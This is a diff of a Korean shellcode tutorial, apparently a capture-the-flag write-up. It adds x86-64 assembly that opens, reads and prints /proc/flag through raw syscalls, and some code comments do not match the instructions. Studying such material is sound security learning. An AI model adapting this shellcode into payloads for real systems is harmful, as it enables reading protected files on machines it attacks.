@@ -143,7 +143,62 @@ STRING을 코드 2와 같이 고치면 어떻게 될까요? 다른 부분도 고
     ```
 
 ### 64비트 코드
-64비트 코드도 대체로 같습니다. 다만 레지스터들이 rdi, rsi, rdx, ... 하는 식으로 바뀌고, 주소값이 64비트로 바뀌고, `int 80` 대신 `syscall`을 이용하는 등의 차이가 있습니다. (`int 80`은 먹히기는 하는데 `syscall`이 더 빨라서, 64비트 머신에서는 `syscall`이 권장된다고 합니다.)
+64비트 코드도 원리는 같습니다. 다만 레지스터들이 rdi, rsi, rdx, ... 하는 식으로 바뀌고, 주소값이 64비트로 바뀌고, `int 80` 대신 `syscall`을 이용하는 등의 차이가 있습니다. (`int 80`은 먹히기는 하는데 `syscall`이 더 빨라서, 64비트 머신에서는 `syscall`이 권장된다고 합니다.) 아래 코드에 해당하는 문제는 위의 코드와는 살짝 다른데, 이번에는 `/bin/cat`을 통해서 출력하는 게 아니라 `/proc/flag`를 직접 open, read, write 하는 문제입니다. 여기서 buf는 메모리의 어떤 곳으로 해당 flag를 read할 때 필요합니다. $rsp-0x500으로 임의로 정했는데 잘 작동합니다. 
+
+```
+#include <sys/syscall.h>
+
+#define STRING  "/proc/flag"
+
+.intel_syntax noprefix
+.text
+
+.globl main
+.type  main, @function
+
+main:
+  jmp     calladdr
+
+popladdr:
+  pop    r8                    /* r10 points to STRING */
+
+  xor    rax,rax                /* get a 64-bit zero value */
+  xor    rdi,rdi                /* get a 64-bit zero value */
+  xor    rsi,rsi                /* get a 64-bit zero value */
+  xor    rdx,rdx                /* get a 64-bit zero value */
+
+  push   r8
+
+  mov    rax,0x2               /* syscall number of open */
+  mov    rsi,0x0                /* arg 2: flag */
+  mov    rdi,r8                 /* arg 1: string filename */
+  xor    rdx,rdx                /* arg 3: int flags */
+  syscall                       /* openat(0, "/proc/flag", 0) */
+
+  mov    rdi,rax                /* arg 1: fd */
+  mov    rsi,rsp                /* arg 2: buf */
+  sub    rsi, 0x500
+  mov    rax,0x0                /* syscall number of read */
+  mov    rdx,0x418              /* arg 3: count */
+  syscall
+
+  mov    rax,0x1                 /* syscall number of write */
+  mov    rdi,0x1                 /* arg 1: stdout */
+  mov    rsi,rsi                 /* arg 2: buf */
+  mov    rdx,0x418               /* arg 3: length of string to read */
+  syscall
+
+  xor    rdi,rdi               /* arg 1: 0 */
+  mov    rax,rdi
+  mov    rax,0x3c                    /* exit(0) */
+  /* mov+inc to avoid null byte */
+  syscall                   /* invoke syscall */
+
+calladdr:
+  call    popladdr
+  .string STRING
+
+```
 
 ## 유용한 명령어들
 - `strace`, `ltrace` : system call 내역을 나열합니다. 
